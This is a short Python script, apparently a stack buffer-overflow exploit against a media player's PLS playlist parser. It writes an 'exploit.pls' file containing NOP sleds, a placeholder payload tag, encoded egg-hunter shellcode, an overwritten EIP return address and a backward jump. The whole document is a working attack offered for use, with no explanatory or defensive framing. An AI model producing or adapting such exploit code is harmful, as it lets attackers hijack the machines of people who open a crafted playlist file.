#!/usr/bin/python

payload = "HACKHACK"

EIP = "\x61\xd9\x02\x02"
eggHunter =  ""
eggHunter += "\xb8\x8d\xe1\x60\x72\xd9\xc5\xd9\x74\x24\xf4\x5f"
eggHunter += "\x33\xc9\xb1\x09\x31\x47\x12\x83\xc7\x04\x03\xca"
eggHunter += "\xef\x82\x87\xb2\x6e\x88\x97\x35\x33\x5f\x02\x4b"
eggHunter += "\xeb\x92\xfc\x77\x0e\x77\x75\x68\xa8\xcf\x34\x35"
eggHunter += "\x82\x46\x61\x16\x61\xb3\x21\x1d\x6d\xbc\xd9"
buffer = ""
buffer += "[playlist]\r\nFile1=\\\\";
buffer += '\x90' * 20
buffer += payload
buffer += '\x90' * (1022 - 20 - len(payload) - len(eggHunter)- 20)
buffer += eggHunter
buffer += '\x90' * 20
buffer += EIP
buffer += "\xeb\x96"
buffer += '\x90' * 10
buffer += "\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"
file = open("exploit.pls", 'w')
file.write(buffer)
file.close()

